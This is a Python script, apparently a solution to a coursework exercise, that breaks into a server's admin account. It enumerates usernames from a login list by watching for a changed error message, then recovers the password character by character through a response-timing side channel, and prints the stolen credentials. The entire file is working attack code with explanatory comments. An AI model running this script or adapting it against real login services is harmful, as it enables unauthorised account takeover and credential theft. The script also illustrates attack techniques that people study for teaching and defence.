import sys
import socket
import json
import datetime
'''
This program muscles its way into a server as an admin using a few tricks.  

1. We have a list of admin logins, one of which will always be true.  We also know that, when we get the right
login, the server's response will change from 'Wrong login!' to 'Wrong password!'

2. We can guess the password one letter at a time.  When the password guess contains correct letters in the
correct positions, it catches an exception before responding with 'Wrong password,' taking some extra time.
when the server takes ~0.1 seconds to respond, it's because the password guess is made up of correct letters 
in the correct position, even if it's incomplete.

'''


def get_list(main_path):
    # turn logins/ passwords into a python list from a .txt file
    with open(main_path) as data:
        data = data.read()
        return data.splitlines()


def send_msg(login_dict, sock):
    # input: dictionary and a socket
    # output: server response in a python dictionary
    #
    # turns our python dictionary into a json string, then sends it to the server via our socket.
    # returns the server's response as a python dictionary
    json_login = json.dumps(login_dict)
    msg = json_login.encode()
    sock.send(msg)
    response = sock.recv(1024)
    return json.loads(response.decode())


def hacker():
    # command line args
    args = sys.argv

    lst = get_list('/Users/jonmi/python/hyperskill/logins.txt')

    with socket.socket() as try_socket:
        # connect to the server using the address from the command line
        address = (args[1], int(args[2]))
        try_socket.connect(address)

        for login in lst:
            # try each login from the list of common logins until we find one that gets the 'Wrong password!'
            # response.
            admin = {"login": login, "password": ' '}
            res = send_msg(admin, try_socket)
            # if we get the 'Wrong password' response, the login is correct. save the credentials we have so far
            # to an admin dictionary and break from the loop.
            if res['result'] == 'Wrong password!':
                break

        # we have to have a blank space password when guessing the login, otherwise we'll get an exception and
        # not the 'Wrong password' response.  We change the password to an empty string here so we can concatenate
        # in the loop without the leading space.
        admin['password'] = ''

        while True:
            # loop through every possible character to guess the password.  When we get a correct char, the server
            # takes a little longer to catch an exception before sending the wrong password response.
            # by timing the server response time, we can tell when we get a correct character in the correct
            # position
            for j in range(33, 127):
                # add character to our password here
                admin['password'] += chr(j)
                # start time when we try to login
                start = datetime.datetime.now()
                res = send_msg(admin, try_socket)
                # finish time when we receive a response, calculate difference between the two times and store
                # .totalseconds()
                finish = datetime.datetime.now()
                diff = (finish - start).total_seconds()
                if res["result"] == 'Connection success!':
                    # if the response is 'Connection success!' then break out of the loop
                    # since our login credentials are correct.
                    break
                elif diff >= 0.01:
                    # if the response time is unusually long (typical time is 3e-05 seconds) break out of the loop
                    # and start guessing the next character in the password.
                    break
                else:
                    # if the response time is normal, it means our guess is wrong.  Slice the last character
                    # from the password and try again
                    admin['password'] = admin['password'][:-1]

            # when we're out of the for loop, break out of the while loop if the response is 'Connection success!'
            # otherwise, start the for loop again and guess the next character in the password.
            if res["result"] == 'Connection success!':
                break

        # print the login dictionary as a json string object.
        print(json.dumps(admin))


if __name__ == '__main__':
    hacker()
